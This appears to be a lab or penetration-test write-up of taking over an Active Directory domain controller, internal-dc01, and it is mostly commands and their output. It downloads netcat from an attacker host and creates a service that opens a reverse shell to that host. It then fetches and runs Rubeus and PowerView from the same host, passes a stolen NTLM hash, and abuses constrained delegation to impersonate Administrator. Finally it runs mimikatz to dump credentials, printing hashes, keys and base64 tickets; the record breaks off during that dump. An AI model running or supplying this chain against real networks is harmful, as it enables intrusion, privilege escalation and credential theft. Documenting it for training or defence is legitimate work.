---
layout: default
---

## internal-dc01 192.168.250.2


From internal-bacth.internal.msp.local is required generate a new reverse shell using a service in order to avoid the known windows double hop error

```
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> powershell -c wget http://192.168.100.15/nc.exe -OutFile C:\nc.exe
powershell -c wget http://192.168.100.15/nc.exe -OutFile C:\nc.exe
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> cmd /c sc create REVERSE binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 80"
cmd /c sc create REVERSE binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 80"
[SC] CreateService SUCCESS
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> cmd /c sc start REVERSE
cmd /c sc start REVERSE
```
Obtaining new shell:
```
PS C:\tools> powercat -l -v -p 80 -t 9999999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 80)
VERBOSE: Connection from [192.168.250.177] port  [tcp] accepted (source port 50599)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

### 1. Impersonate batchsvc user 

```
C:\>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> wget http://192.168.100.15:443/Rubeus.exe -OutFile C:\Rubeus.exe
wget http://192.168.100.15:443/Rubeus.exe -OutFile C:\Rubeus.exe
PS C:\> .\Rubeus.exe asktgt /domain:internal.msp.local /user:batchsvc /ntlm:10ee9d3f6da987cac9357548fadb7f7b /ptt
.\Rubeus.exe asktgt /domain:internal.msp.local /user:batchsvc /ntlm:10ee9d3f6da987cac9357548fadb7f7b /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 10ee9d3f6da987cac9357548fadb7f7b
[*] Building AS-REQ (w/ preauth) for: 'internal.msp.local\batchsvc'
[*] Using domain controller: 192.168.250.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      aW50ZXJuYWwubXNwLmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/internal.msp.local
  ServiceRealm             :  INTERNAL.MSP.LOCAL
  UserName                 :  batchsvc
  UserRealm                :  INTERNAL.MSP.LOCAL
  StartTime                :  7/23/2024 10:37:41 AM
  EndTime                  :  7/23/2024 8:37:41 PM
  RenewTill                :  7/30/2024 10:37:41 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  F2qBYwRextjCntTuzZQ2sQ==
  ASREP (key)              :  10EE9D3F6DA987CAC9357548FADB7F7B

```

### 2. Enumerate internal.msp.local Trusted to Auth

```
PS C:\> IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15:443/PowerView.ps1")
IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15:443/PowerView.ps1")
PS C:\> Get-DomainComputer -TrustedToAuth
Get-DomainComputer -TrustedToAuth


pwdlastset                    : 7/3/2024 8:54:49 PM
logoncount                    : 431
badpasswordtime               : 7/23/2024 10:42:34 AM
distinguishedname             : CN=INTERNAL-BATCH,CN=Computers,DC=internal,DC=msp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 7/22/2024 8:03:53 PM
name                          : INTERNAL-BATCH
objectsid                     : S-1-5-21-2754435719-1041067879-922430489-1104
samaccountname                : INTERNAL-BATCH$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : INTERNAL-BATCH
whenchanged                   : 7/23/2024 3:03:53 AM
instancetype                  : 4
usncreated                    : 16418
objectguid                    : 720eb60c-a01d-4cbf-b07e-6bf49ef2db2c
operatingsystem               : Windows Server 2019 Datacenter
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {http/internal-dc01.internal.msp.local/internal.msp.local,
                                http/internal-dc01.internal.msp.local, http/INTERNAL-DC01,
                                http/internal-dc01.internal.msp.local/INTERNALMSP...}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=msp,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {TERMSRV/INTERNAL-BATCH, TERMSRV/internal-batch.internal.msp.local,
                                WSMAN/internal-batch, WSMAN/internal-batch.internal.msp.local...}
lastlogon                     : 7/23/2024 10:44:10 AM
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 5/27/2019 5:11:22 AM
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1398980
dnshostname                   : internal-batch.internal.msp.local
```

Expand property:
```
PS C:\> Get-DomainComputer -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
http/internal-dc01.internal.msp.local/internal.msp.local
http/internal-dc01.internal.msp.local
http/INTERNAL-DC01
http/internal-dc01.internal.msp.local/INTERNALMSP
http/INTERNAL-DC01/INTERNALMSP
rpcss/internal-dc01.internal.msp.local/internal.msp.local
rpcss/internal-dc01.internal.msp.local
rpcss/INTERNAL-DC01
rpcss/internal-dc01.internal.msp.local/INTERNALMSP
rpcss/INTERNAL-DC01/INTERNALMSP
HOST/internal-dc01.internal.msp.local/internal.msp.local
HOST/internal-dc01.internal.msp.local
HOST/INTERNAL-DC01
HOST/internal-dc01.internal.msp.local/INTERNALMSP
HOST/INTERNAL-DC01/INTERNALMSP
```

### 3. Abusse trusted to authenticate domain property  for internal-batch$

Impersonate authentication for HTTP/internal-dc01.internal.msp.local

```
PS C:\> .\Rubeus.exe s4u /user:INTERNAL-BATCH$ /domain:internal.msp.local /aes256:fc5e5ba6ac0e70f17e04b92fe0ebfc4b6e5b1676673d798c1acf1a1e93002755 /impersonateuser:Administrator /msdsspn:http/internal-dc01.internal.msp.local /altservice:HTTP /ptt
.\Rubeus.exe s4u /user:INTERNAL-BATCH$ /domain:internal.msp.local /aes256:fc5e5ba6ac0e70f17e04b92fe0ebfc4b6e5b1676673d798c1acf1a1e93002755 /impersonateuser:Administrator /msdsspn:http/internal-dc01.internal.msp.local /altservice:HTTP /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: fc5e5ba6ac0e70f17e04b92fe0ebfc4b6e5b1676673d798c1acf1a1e93002755
[*] Building AS-REQ (w/ preauth) for: 'internal.msp.local\INTERNAL-BATCH$'
[*] Using domain controller: 192.168.250.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      YnRndBsSaW50ZXJuYWwubXNwLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'INTERNAL-BATCH$@INTERNAL.MSP.LOCAL'
[*] Using domain controller: internal-dc01.internal.msp.local (192.168.250.2)
[*] Sending S4U2self request to 192.168.250.2:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'INTERNAL-BATCH$@INTERNAL.MSP.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'http/internal-dc01.internal.msp.local'
[*]   Final ticket will be for the alternate service 'HTTP'
[*] Building S4U2proxy request for service: 'http/internal-dc01.internal.msp.local'
[*] Using domain controller: internal-dc01.internal.msp.local (192.168.250.2)
[*] Sending S4U2proxy request to domain controller 192.168.250.2:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'HTTP'
[*] base64(ticket.kirbi) for SPN 'HTTP/internal-dc01.internal.msp.local':

      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
[+] Ticket successfully imported!
```


### 4. Access to internal-dc01.internal.msp.local


```
PS C:\> winrs.exe -r:internal-dc01.internal.msp.local cmd
winrs.exe -r:internal-dc01.internal.msp.local cmd
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

```


### 5. disable AV and Dump LSA

```
PS C:\Users\Administrator> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 1163846 (00000000:0011c246)
Session           : RemoteInteractive from 2
User Name         : administrator
Domain            : INTERNALMSP
Logon Server      : INTERNAL-DC01
Logon Time        : 4/29/2024 12:03:38 AM
SID               : S-1-5-21-2754435719-1041067879-922430489-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : INTERNALMSP
         * NTLM     : 3be591c12e5b21818dccf376674fcba6
         * SHA1     : 0a79847ec1a20777eddacb86ed3d84cfe2727f80
         * DPAPI    : 1d3b02948d8d73cd809120026c1a3945
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : INTERNAL.MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1123332 (00000000:00112404)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:03:22 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 28502 (00000000:00006f56)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
